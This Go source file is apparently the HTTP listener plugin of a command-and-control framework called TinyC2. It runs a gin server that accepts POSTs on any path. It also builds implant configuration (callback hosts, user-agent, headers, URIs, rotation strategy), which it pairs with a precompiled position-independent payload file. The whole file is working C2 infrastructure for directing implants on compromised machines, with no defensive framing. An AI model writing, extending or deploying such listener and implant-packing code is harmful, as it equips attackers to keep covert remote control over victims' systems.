// Package listener
package listener

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"os"
	"time"

	"github.com/0xPrimo/TinyC2/sdk"

	"http/pkg/packer"

	"github.com/gin-gonic/gin"
	"github.com/goccy/go-yaml"
)

type HTTPListener struct {
	Name   string
	Engine sdk.IEngine
	Server *http.Server
	Config HTTPConfig
}

type Host struct {
	IP   string `yaml:"ip"`
	Port uint16 `yaml:"port"`
}

type HTTPConfig struct {
	BindHost  string            `yaml:"bindhost"`
	BindPort  uint16            `yaml:"bindport"`
	Hosts     []Host            `yaml:"hosts"`
	Rotation  string            `yaml:"rotation-strategy"`
	UserAgent string            `yaml:"user-agent"`
	Method    string            `yaml:"method"`
	Uris      []string          `yaml:"uris"`
	Headers   map[string]string `yaml:"headers"`
}

func NewHTTPListener(engine sdk.IEngine, name string, config string) (sdk.IListener, error) {
	data, err := os.ReadFile(config)
	if err != nil {
		return nil, err
	}

	var cfg HTTPConfig
	if err := yaml.Unmarshal(data, &cfg); err != nil {
		return nil, err
	}

	return &HTTPListener{
		Name:   name,
		Engine: engine,
		Config: cfg,
	}, nil
}

func (h *HTTPListener) Start() error {
	addr := fmt.Sprintf("%s:%d", h.Config.BindHost, h.Config.BindPort)
	err := IsValidAddress(addr)
	if err != nil {
		return fmt.Errorf("listener start: %v", err)
	}

	gin.SetMode(gin.ReleaseMode)

	r := gin.New()
	r.POST("/*any", CreateHTTPHandler(h))

	h.Server = &http.Server{
		Addr:    addr,
		Handler: r,
	}

	go func() {
		if err := h.Server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			h.Engine.LogError(h.Name, "listen and serve error: %v", err)
		}
	}()

	return nil
}

func (h *HTTPListener) Stop() error {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := h.Server.Shutdown(ctx); err != nil {
		h.Engine.LogWarning(h.Name, "listener forced to shutdown: %v", err)
	}

	return nil
}

func (h *HTTPListener) MakePic(id uint32) ([]byte, []byte, error) {
	configArray := []any{}

	configArray = append(configArray, uint32(id))
	configArray = append(configArray, h.Config.UserAgent)
	configArray = append(configArray, h.Config.Method)

	switch h.Config.Rotation {
	case "round-robin":
		configArray = append(configArray, uint16(1))
	default:
		configArray = append(configArray, uint16(0))
	}

	configArray = append(configArray, uint16(len(h.Config.Uris)))
	configArray = append(configArray, uint16(len(h.Config.Headers)))
	configArray = append(configArray, uint16(len(h.Config.Hosts)))

	for _, host := range h.Config.Hosts {
		configArray = append(configArray, host.IP)
		configArray = append(configArray, uint16(host.Port))
	}

	for key, value := range h.Config.Headers {
		configArray = append(configArray, key+": "+value+"\r\n")
	}

	for _, uri := range h.Config.Uris {
		configArray = append(configArray, uri)
	}

	picargs, err := packer.Pack(configArray...)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to pack configurations: %v", err)
	}

	data, err := os.ReadFile("plugins/http/bin/channel.x64.pic")
	if err != nil {
		return nil, nil, fmt.Errorf("failed to read pic: %w", err)
	}

	return data, picargs, nil
}

func IsValidAddress(address string) error {
	listener, err := net.Listen("tcp", address)
	if err != nil {
		return err
	}

	_ = listener.Close()
	return nil
}
